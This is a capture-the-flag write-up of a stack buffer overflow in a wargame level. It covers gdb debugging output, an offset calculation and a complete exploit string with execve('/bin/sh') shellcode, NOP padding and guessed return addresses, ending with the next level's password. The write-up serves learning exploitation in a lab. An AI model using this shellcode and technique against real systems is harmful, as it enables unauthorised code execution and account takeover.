# Performing BufferOverflow to find flag
## My Approach:

### Code
``` #include <stdio.h>  
 #include <stdlib.h> 
 #include <string.h> 

int main(int argc, char **argv) {

    char buf[1024];

    strcpy(buf, argv[1]);
    return 0;
}
``` 

As we can see from the code, the unsafe function strcpy is being used to copy user input to a buffer.
We can first check whether the address space is randomized or not. 

```
level1@lxc-pwn-x86:/levels$ cat /proc/sys/kernel/randomize_va_space
0
```

As we can see the address space is not randomized. We now need to find the address of the buffer to run our shellcode.
```
Dump of assembler code for function main:
   0x0804841c <+0>:     push   %ebp
   0x0804841d <+1>:     mov    %esp,%ebp
   0x0804841f <+3>:     and    $0xfffffff0,%esp
   0x08048422 <+6>:     sub    $0x410,%esp
   0x08048428 <+12>:    mov    0xc(%ebp),%eax
   0x0804842b <+15>:    add    $0x4,%eax
   0x0804842e <+18>:    mov    (%eax),%eax
   0x08048430 <+20>:    mov    %eax,0x4(%esp)
   0x08048434 <+24>:    lea    0x10(%esp),%eax
   0x08048438 <+28>:    mov    %eax,(%esp)
   0x0804843b <+31>:    call   0x8048300 <strcpy@plt>
   0x08048440 <+36>:    mov    $0x0,%eax
   0x08048445 <+41>:    leave
   0x08048446 <+42>:    ret
End of assembler dump.
(gdb) b * 0x0804843b
Breakpoint 1 at 0x804843b: file level1.c, line 9.
(gdb) r AAAA
Starting program: /levels/level1 AAAA

Breakpoint 1, 0x0804843b in main (argc=2, argv=0xffffdd14) at level1.c:9
9           strcpy(buf, argv[1]);
(gdb) x/w $eax
0xffffd870:     4
(gdb) x/xw $eax
0xffffd870:     0x00000004
(gdb) x/xw $esp
0xffffd860:     0xffffd870
(gdb) x/xw 0xffffd870
0xffffd870:     0x00000004
(gdb) b *0x08048440
Breakpoint 2 at 0x8048440: file level1.c, line 10.
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0xffffdd14) at level1.c:10
10          return 0;
(gdb) x/200xw $esp
0xffffd860:     0xffffd870      0xffffde46      0x00000048      0x00000004
0xffffd870:     0x41414141      0x6474e500      0x00162688      0x00162688
```

As we can see our buffer address is 0xffffd870.  Now, all we need to do is give an input big enough to corrupt the return address.

```
(gdb) r $(python -c 'print "A"*1040')
(gdb) x/xw $ebp+4
0xffffd86c:     0x41414141
```

We now know that we need roughly about 1040 bytes to hit the return address. We can design our input in such a way that we can place the address of our buffer in the return address.
To do this we need to run the following:

```
(gdb) r $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*1012 + "\x60\xd4\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*1012 + "\x60\xd4\xff\xff"')

Breakpoint 1, main (argc=0, argv=0xffffd904) at level1.c:10
10          return 0;
(gdb) c
Continuing.
process 24285 is executing new program: /bin/sh
```

We have spawned a shell from gdb. Now we need to do the same outside gdb.

```
level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*1012 + "\x60\xd4\xff\xff"')
Segmentation fault
```

Hmmm....it seems the address is changing when we're outside gdb. Let us try some different values for the address.

```
level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*1012 + "\x70\xd4\xff\xff"')
Segmentation fault
level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*1012 + "\x80\xd4\xff\xff"')
level2@lxc-pwn-x86:/levels$ cat ~/.pass
TJyK9lJwZrgqc8nIIF6o
level2@lxc-pwn-x86:/levels$
```

We have found the password for the next level. 
## Password is: TJyK9lJwZrgqc8nIIF6o
